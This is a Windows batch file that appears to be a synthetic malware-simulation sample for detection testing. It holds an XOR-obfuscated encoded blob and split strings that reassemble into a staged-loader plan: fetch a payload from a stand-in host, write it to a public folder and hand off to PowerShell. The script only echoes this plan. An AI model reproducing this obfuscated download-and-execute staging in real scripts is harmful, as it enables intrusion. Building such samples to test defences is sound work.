@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:split_fragments|reverse_xor

rem HUNTRESS-MATERIAL:AkBDHQMLVwoABgUEBVceVlRSR0AOVlRSR0BsR0tWXU9HUlcdAwtXCgAGBQQFVx5WVFJHQG9RUn9AQFZBR11Ge29QWl9RRmNvQEFWQGZvCXAOW0dSQ2xWX1pVT0dSVx0HCwUBAgFWAxxXWl9SRV1aHVZfQ15SS1YdAwtXCgAGBQQFVxwcCUBDR0dbDl9BRk8DC1cKAAYFBAVXHl1UWlJDXlJQDldabF1UWlJDXlJQT19fVltAQVZEXEMOVlRSRlRdUl9sR0tWXU9HRlxsXVJVDltDUkFUTwcOR11GXFBsVlRSR0BPVktWHV9fVltAQVZEXEMOQVZHQ1JXUk9HQ1pBUEBsVVVcV11SWx9AQFZQXEFDbFtQR1JDQFpXH1ZfWlVsVkdaQUQfVkdcXlZBbFZBWkZCUFIOQENWR0BPAg5F

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "item0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=powe"
set "item1=rshell.exe|stage_count=4|graph=fan_out|next_language=powershell|campaign_id=camp"
set "item2=aign-d676539d80|url=https://d676539d80.example.invalid/0e212684.dat|file_path=C:"
set "item3=\Users\Public\HuntressLab\stage-d676539d80.dat|next_stage=stage-d676539d80.ps1"

goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE

set "neutral_opaque_branch=c7d897af"

call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "item9=!item0!!item1!!item2!!item3!"
exit /b 0
:HUNTRESS_EMIT

echo(!item9!

exit /b 0

:HUNTRESS_PLAN

echo powershell.exe acquire, write, dispatch, and hand off stage-d676539d80.ps1

exit /b 0

